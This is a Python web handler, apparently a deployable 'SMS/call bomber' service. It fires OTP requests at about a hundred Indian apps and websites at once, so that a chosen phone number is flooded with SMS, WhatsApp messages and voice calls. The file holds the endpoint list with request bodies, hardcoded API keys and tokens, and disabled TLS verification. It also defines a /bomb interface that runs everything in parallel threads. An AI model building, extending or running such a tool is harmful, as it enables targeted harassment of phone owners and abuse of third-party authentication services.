from http.server import BaseHTTPRequestHandler
import json
import urllib.request
import urllib.parse
import ssl
import time
import concurrent.futures
from datetime import datetime

DEVELOPER = "@ZEERYXFF"
VERSION = "1.0"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

APIS = [
    # ═══════════════ CALL ═══════════════
    {"name":"Tata Capital Voice","type":"Call","method":"POST",
     "url":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
     "headers":{"Content-Type":"application/json","User-Agent":"Dalvik/2.1.0 (Linux; U; Android 10)"},
     "data": lambda p: '{"phone":"%s","isOtpViaCallAtLogin":"true"}' % p},

    {"name":"1MG Voice","type":"Call","method":"POST",
     "url":"https://www.1mg.com/auth_api/v6/create_token",
     "headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.12.0"},
     "data": lambda p: '{"number":"%s","otp_on_call":true}' % p},

    {"name":"Swiggy Call","type":"Call","method":"POST",
     "url":"https://profile.swiggy.com/api/v3/app/request_call_verification",
     "headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Myntra Voice","type":"Call","method":"POST",
     "url":"https://www.myntra.com/gw/mobile-auth/voice-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Flipkart Voice","type":"Call","method":"POST",
     "url":"https://www.flipkart.com/api/6/user/voice-otp/generate",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Amazon Voice","type":"Call","method":"POST",
     "url":"https://www.amazon.in/ap/signin",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "phone=%s&action=voice_otp" % p},

    {"name":"Paytm Voice","type":"Call","method":"POST",
     "url":"https://accounts.paytm.com/signin/voice-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Zomato Voice","type":"Call","method":"POST",
     "url":"https://www.zomato.com/php/o2_api_handler.php",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "phone=%s&type=voice" % p},

    {"name":"MakeMyTrip Voice","type":"Call","method":"POST",
     "url":"https://www.makemytrip.com/api/4/voice-otp/generate",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Goibibo Voice","type":"Call","method":"POST",
     "url":"https://www.goibibo.com/user/voice-otp/generate/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Ola Voice","type":"Call","method":"POST",
     "url":"https://api.olacabs.com/v1/voice-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Uber Voice","type":"Call","method":"POST",
     "url":"https://auth.uber.com/v2/voice-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    # ═══════════════ WHATSAPP ═══════════════
    {"name":"KPN WhatsApp","type":"WhatsApp","method":"POST",
     "url":"https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
     "headers":{"x-app-id":"66ef3594-1e51-4e15-87c5-05fc8208a20f","content-type":"application/json; charset=UTF-8","User-Agent":"okhttp/4.9.3"},
     "data": lambda p: '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"%s"}}' % p},

    {"name":"Foxy WhatsApp","type":"WhatsApp","method":"POST",
     "url":"https://www.foxy.in/api/v2/users/send_otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0","Platform":"web"},
     "data": lambda p: '{"user":{"phone_number":"+91%s"},"via":"whatsapp"}' % p},

    {"name":"Stratzy WhatsApp","type":"WhatsApp","method":"POST",
     "url":"https://stratzy.in/api/web/whatsapp/sendOTP",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phoneNo":"%s"}' % p},

    {"name":"Jockey WhatsApp","type":"WhatsApp","method":"GET",
     "url": lambda p: "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91%s?whatsapp=true" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"Rappi WhatsApp","type":"WhatsApp","method":"POST",
     "url":"https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
     "headers":{"Content-Type":"application/json; charset=utf-8","User-Agent":"okhttp/3.9.1"},
     "data": lambda p: '{"country_code":"+91","phone":"%s"}' % p},

    {"name":"Eka Care WhatsApp","type":"WhatsApp","method":"POST",
     "url":"https://auth.eka.care/auth/init",
     "headers":{"Client-Id":"androidp","Content-Type":"application/json; charset=UTF-8","User-Agent":"okhttp/4.9.3"},
     "data": lambda p: '{"payload":{"allowWhatsapp":true,"mobile":"+91%s"},"type":"mobile"}' % p},

    # ═══════════════ SMS ═══════════════
    {"name":"Lenskart SMS","type":"SMS","method":"POST",
     "url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0","X-API-Client":"mobilesite"},
     "data": lambda p: '{"phoneCode":"+91","telephone":"%s"}' % p},

    {"name":"NoBroker SMS","type":"SMS","method":"POST",
     "url":"https://www.nobroker.in/api/v3/account/otp/send",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "phone=%s&countryCode=IN" % p},

    {"name":"PharmEasy SMS","type":"SMS","method":"POST",
     "url":"https://pharmeasy.in/api/v2/auth/send-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Wakefit SMS","type":"SMS","method":"POST",
     "url":"https://api.wakefit.co/api/consumer-sms-otp/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0","API-Secret-Key":"ycq55IbIjkLb","API-Token":"c84d563b77441d784dce71323f69eb42"},
     "data": lambda p: '{"mobile":"%s","whatsapp_opt_in":1}' % p},

    {"name":"Byju's SMS","type":"SMS","method":"POST",
     "url":"https://api.byjus.com/v2/otp/send",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Hungama OTP","type":"SMS","method":"POST",
     "url":"https://communication.api.hungama.com/v1/communication/otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobileNo":"%s","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}' % p},

    {"name":"Meru Cab","type":"SMS","method":"POST",
     "url":"https://merucabapp.com/api/otp/generate",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"okhttp/4.9.0","DeviceType":"Android"},
     "data": lambda p: "mobile_number=%s" % p},

    {"name":"Doubtnut","type":"SMS","method":"POST",
     "url":"https://api.doubtnut.com/v4/student/login",
     "headers":{"content-type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone_number":"%s","language":"en"}' % p},

    {"name":"PenPencil","type":"SMS","method":"POST",
     "url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     "headers":{"content-type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"organizationId":"5eb393ee95fab7468a79d189","mobile":"%s"}' % p},

    {"name":"Snitch","type":"SMS","method":"POST",
     "url":"https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile_number":"+91%s"}' % p},

    {"name":"Dayco India","type":"SMS","method":"POST",
     "url":"https://ekyc.daycoindia.com/api/nscript_functions.php",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "api=send_otp&brand=dayco&mob=%s&resend_otp=resend_otp" % p},

    {"name":"BeepKart","type":"SMS","method":"POST",
     "url":"https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","city":362}' % p},

    {"name":"Lending Plate","type":"SMS","method":"POST",
     "url":"https://lendingplate.com/api.php",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest"},
     "data": lambda p: "mobiles=%s&resend=Resend" % p},

    {"name":"ShipRocket","type":"SMS","method":"POST",
     "url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobileNumber":"%s"}' % p},

    {"name":"GoKwik","type":"SMS","method":"POST",
     "url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0","gk-signature":"076108"},
     "data": lambda p: '{"phone":"%s","country":"in"}' % p},

    {"name":"NewMe","type":"SMS","method":"POST",
     "url":"https://prodapi.newme.asia/web/otp/request",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile_number":"%s","resend_otp_request":true}' % p},

    {"name":"Univest","type":"SMS","method":"GET",
     "url": lambda p: "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=%s" % p,
     "headers":{"User-Agent":"okhttp/3.9.1"},
     "data": None},

    {"name":"Smytten","type":"SMS","method":"POST",
     "url":"https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","email":"test@example.com"}' % p},

    {"name":"CaratLane","type":"SMS","method":"POST",
     "url":"https://www.caratlane.com/cg/dhevudu",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"query":"mutation {SendOtp(input: {mobile: \\"%s\\",isdCode: \\"91\\",otpType: \\"registerOtp\\"}) {status {message code}}}"}' % p},

    {"name":"BikeFixup","type":"SMS","method":"POST",
     "url":"https://api.bikefixup.com/api/v2/send-registration-otp",
     "headers":{"Content-Type":"application/json; charset=UTF-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","app_signature":"4pFtQJwcz6y"}' % p},

    {"name":"WellAcademy","type":"SMS","method":"POST",
     "url":"https://wellacademy.in/store/api/numberLoginV2",
     "headers":{"Content-Type":"application/json; charset=UTF-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"contact_no":"%s"}' % p},

    {"name":"ServeTel","type":"SMS","method":"POST",
     "url":"https://api.servetel.in/v1/auth/otp",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=utf-8","User-Agent":"Dalvik/2.1.0"},
     "data": lambda p: "mobile_number=%s" % p},

    {"name":"GoPink Cabs","type":"SMS","method":"POST",
     "url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest"},
     "data": lambda p: "check_mobile_number=1&contact=%s" % p},

    {"name":"Shemaroome","type":"SMS","method":"POST",
     "url":"https://www.shemaroome.com/users/resend_otp",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0","X-Requested-With":"XMLHttpRequest"},
     "data": lambda p: "mobile_no=%%2B91%s" % p},

    {"name":"Cossouq","type":"SMS","method":"POST",
     "url":"https://www.cossouq.com/mobilelogin/otp/send",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "mobilenumber=%s&otptype=register" % p},

    {"name":"MyImagineStore","type":"SMS","method":"POST",
     "url":"https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/",
     "headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "mobile=%s" % p},

    {"name":"Otpless","type":"SMS","method":"POST",
     "url":"https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","selectedCountryCode":"+91"}' % p},

    {"name":"MyHubble Money","type":"SMS","method":"POST",
     "url":"https://api.myhubble.money/v1/auth/otp/generate",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phoneNumber":"%s","channel":"SMS"}' % p},

    {"name":"Tata Capital Business","type":"SMS","method":"POST",
     "url":"https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobileNumber":"%s","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}' % p},

    {"name":"DealShare","type":"SMS","method":"POST",
     "url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","hashCode":"k387IsBaTmn"}' % p},

    {"name":"Snapmint","type":"SMS","method":"POST",
     "url":"https://api.snapmint.com/v1/public/sign_up",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Housing.com","type":"SMS","method":"POST",
     "url":"https://login.housing.com/api/v2/send-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","country_url_name":"in"}' % p},

    {"name":"RentoMojo","type":"SMS","method":"POST",
     "url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Khatabook","type":"SMS","method":"POST",
     "url":"https://api.khatabook.com/v1/auth/request-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","app_signature":"wk+avHrHZf2"}' % p},

    {"name":"Netmeds","type":"SMS","method":"POST",
     "url":"https://apiv2.netmeds.com/mst/rest/v1/id/details/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Nykaa","type":"SMS","method":"POST",
     "url":"https://www.nykaa.com/app-api/index.php/customer/send_otp",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: "source=sms&app_version=3.0.9&mobile_number=%s&platform=ANDROID&domain=nykaa" % p},

    {"name":"RummyCircle","type":"SMS","method":"POST",
     "url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","isPlaycircle":false}' % p},

    {"name":"Animall","type":"SMS","method":"POST",
     "url":"https://animall.in/zap/auth/login",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","signupPlatform":"NATIVE_ANDROID"}' % p},

    {"name":"PenPencil V3","type":"SMS","method":"POST",
     "url":"https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Entri","type":"SMS","method":"POST",
     "url":"https://entri.app/api/v3/users/check-phone/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s"}' % p},

    {"name":"Cosmofeed","type":"SMS","method":"POST",
     "url":"https://prod.api.cosmofeed.com/api/user/authenticate",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","version":"1.4.28"}' % p},

    {"name":"Aakash","type":"SMS","method":"POST",
     "url":"https://antheapi.aakash.ac.in/api/generate-lead-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile_number":"%s","activity_type":"aakash-myadmission"}' % p},

    {"name":"Revv","type":"SMS","method":"POST",
     "url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","deviceType":"website"}' % p},

    {"name":"DeHaat","type":"SMS","method":"POST",
     "url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","client_id":"kisan-app"}' % p},

    {"name":"A23 Games","type":"SMS","method":"POST",
     "url":"https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","device_id":"android123","model":"Google,Android SDK built for x86,10"}' % p},

    {"name":"Spencer's","type":"SMS","method":"POST",
     "url":"https://jiffy.spencers.in/user/auth/otp/send",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"PayMe India","type":"SMS","method":"POST",
     "url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"phone":"%s","app_signature":"S10ePIIrbH3"}' % p},

    {"name":"Shopper's Stop","type":"SMS","method":"POST",
     "url":"https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","type":"SIGNIN_WITH_MOBILE"}' % p},

    {"name":"Hyuga Auth","type":"SMS","method":"POST",
     "url":"https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"BigCash","type":"SMS","method":"GET",
     "url": lambda p: "https://www.bigcash.live/sendsms.php?mobile=%s&ip=192.168.1.1" % p,
     "headers":{"Referer":"https://www.bigcash.live/games/poker","User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"Lifestyle Stores","type":"SMS","method":"POST",
 "url":"https://www.lifestylestores.com/in/en/mobilelogin/sendOTP",
 "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
 "data": lambda p: '{"signInMobile":"%s","channel":"sms"}' % p},

{"name":"PokerBaazi","type":"SMS","method":"POST",
 "url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
 "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
 "data": lambda p: '{"mobile":"%s","mfa_channels":"phno"}' % p},

    {"name":"My11Circle","type":"SMS","method":"POST",
     "url":"https://www.my11circle.com/api/fl/auth/v3/getOtp",
     "headers":{"Content-Type":"application/json;charset=UTF-8","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"MamaEarth","type":"SMS","method":"POST",
     "url":"https://auth.mamaearth.in/v1/auth/initiate-signup",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"HomeTriangle","type":"SMS","method":"POST",
     "url":"https://hometriangle.com/api/partner/xauth/signup/otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Wellness Forever","type":"SMS","method":"POST",
     "url":"https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     "headers":{"Content-Type":"application/x-www-form-urlencoded","User-Agent":"Mozilla/5.0"},
     "data": lambda p: 'method=firstRegisterApi&data={"customerMobile":"%s","generateOtp":"true"}' % p},

    {"name":"HealthMug","type":"SMS","method":"POST",
     "url":"https://api.healthmug.com/account/createotp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Vyapar","type":"SMS","method":"GET",
     "url": lambda p: "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile=%s" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"Kredily","type":"SMS","method":"POST",
     "url":"https://app.kredily.com/ws/v1/accounts/send-otp/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"Tata Motors","type":"SMS","method":"POST",
     "url":"https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","sendOtp":"true"}' % p},

    {"name":"Moglix","type":"SMS","method":"POST",
     "url":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","buildVersion":"24.0"}' % p},

    {"name":"MyGov","type":"SMS","method":"GET",
     "url": lambda p: "https://auth.mygov.in/regapi/register_api_ver1/?&api_key=57076294a5e2ab7fe000000112c9e964291444e07dc276e0bca2e54b&name=raj&email=&gateway=91&mobile=%s&gender=male" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"TrulyMadly","type":"SMS","method":"POST",
     "url":"https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","locale":"IN"}' % p},

    {"name":"Apna","type":"SMS","method":"POST",
     "url":"https://production.apna.co/api/userprofile/v1/otp/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","hash_type":"play_store"}' % p},

    {"name":"CodFirm","type":"SMS","method":"GET",
     "url": lambda p: "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber=%%2B91%s&email=&storeUrl=bellavita1.myshopify.com" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"Swipe","type":"SMS","method":"POST",
     "url":"https://app.getswipe.in/api/user/mobile_login",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","resend":true}' % p},

    {"name":"More Retail","type":"SMS","method":"POST",
     "url":"https://omni-api.moreretail.in/api/v1/login/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","hash_key":"XfsoCeXADQA"}' % p},

    {"name":"Country Delight","type":"SMS","method":"POST",
     "url":"https://api.countrydelight.in/api/v1/customer/requestOtp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","platform":"Android","mode":"new_user"}' % p},

    {"name":"AstroSage","type":"SMS","method":"GET",
     "url": lambda p: "https://vartaapi.astrosage.com/sdk/registerAS?operation_name=signup&countrycode=91&pkgname=com.ojassoft.astrosage&appversion=23.7&lang=en&deviceid=android123&regsource=AK_Varta%20user%20app&key=-787506999&phoneno=%s" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"Rapido","type":"SMS","method":"POST",
     "url":"https://customer.rapido.bike/api/otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},

    {"name":"TooToo","type":"SMS","method":"POST",
     "url":"https://tootoo.in/graphql",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"query":"query sendOtp($mobile_no: String!, $resend: Int!) { sendOtp(mobile_no: $mobile_no, resend: $resend) { success __typename } }","variables":{"mobile_no":"%s","resend":0}}' % p},

    {"name":"ConfirmTkt","type":"SMS","method":"GET",
     "url": lambda p: "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber=%s" % p,
     "headers":{"User-Agent":"Mozilla/5.0"},
     "data": None},

    {"name":"BetterHalf","type":"SMS","method":"POST",
     "url":"https://api.betterhalf.ai/v2/auth/otp/send/",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","isd_code":"91"}' % p},

    {"name":"Charzer","type":"SMS","method":"POST",
     "url":"https://api.charzer.com/auth-service/send-otp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s","appSource":"CHARZER_APP"}' % p},

    {"name":"Nuvama Wealth","type":"SMS","method":"POST",
     "url":"https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobileNo":"%s","emailID":"test@example.com"}' % p},

    {"name":"Mpokket","type":"SMS","method":"POST",
     "url":"https://web-api.mpokket.in/registration/sendOtp",
     "headers":{"Content-Type":"application/json","User-Agent":"Mozilla/5.0"},
     "data": lambda p: '{"mobile":"%s"}' % p},
]


def fire(api, phone):
    start = time.time()
    try:
        url = api["url"](phone) if callable(api["url"]) else api["url"]
        data = api["data"](phone) if api.get("data") else None
        if isinstance(data, str):
            data = data.encode("utf-8")
        req = urllib.request.Request(
            url,
            data=data,
            headers=api.get("headers", {}),
            method=api.get("method", "POST")
        )
        with urllib.request.urlopen(req, timeout=8, context=ctx) as resp:
            code = resp.status
            elapsed = (time.time() - start) * 1000
            return {
                "name": api["name"],
                "type": api["type"],
                "status": "success" if code in (200,201,202,204) else "failed",
                "code": code,
                "time_ms": round(elapsed)
            }
    except Exception as e:
        elapsed = (time.time() - start) * 1000
        return {
            "name": api["name"],
            "type": api["type"],
            "status": "error",
            "error": str(e)[:60],
            "time_ms": round(elapsed)
        }


class handler(BaseHTTPRequestHandler):
    def _send(self, data, code=200):
        body = json.dumps(data, indent=2).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self._send({"ok": True})

    def do_GET(self):
        self._send({
            "service": "ULTIMATE BOMBER API",
            "developer": DEVELOPER,
            "version": VERSION,
            "total_apis": len(APIS),
            "call": sum(1 for a in APIS if a["type"]=="Call"),
            "sms": sum(1 for a in APIS if a["type"]=="SMS"),
            "whatsapp": sum(1 for a in APIS if a["type"]=="WhatsApp"),
            "endpoints": {
                "GET /": "info",
                "POST /bomb": "body: {phone}",
                "POST /bomb/Call": "only call",
                "POST /bomb/SMS": "only sms",
                "POST /bomb/WhatsApp": "only whatsapp"
            }
        })

    def do_POST(self):
        try:
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length else "{}"
            payload = json.loads(body) if body else {}
        except Exception:
            self._send({"error": "invalid json"}, 400)
            return

        phone = str(payload.get("phone", "")).strip()
        if not phone.isdigit() or len(phone) != 10:
            self._send({"error": "phone must be 10 digits"}, 400)
            return

        path = self.path.split("?")[0].strip("/")
        parts = path.split("/") if path else []
        api_type = parts[1] if len(parts) > 1 else None

        apis = APIS
        if api_type:
            apis = [a for a in apis if a["type"].lower() == api_type.lower()]
            if not apis:
                self._send({"error": "no apis for type %s" % api_type}, 404)
                return

        start = time.time()
        results = []
        success = failed = errors = 0

        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as pool:
            futures = [pool.submit(fire, api, phone) for api in apis]
            for f in concurrent.futures.as_completed(futures):
                r = f.result()
                results.append(r)
                if r["status"] == "success": success += 1
                elif r["status"] == "failed": failed += 1
                else: errors += 1

        elapsed = time.time() - start

        self._send({
            "status": "completed",
            "phone": phone,
            "type": api_type or "all",
            "total_apis": len(apis),
            "success": success,
            "failed": failed,
            "errors": errors,
            "time_sec": round(elapsed, 2),
            "timestamp": datetime.utcnow().isoformat(),
            "developer": DEVELOPER,
            "results": results
        })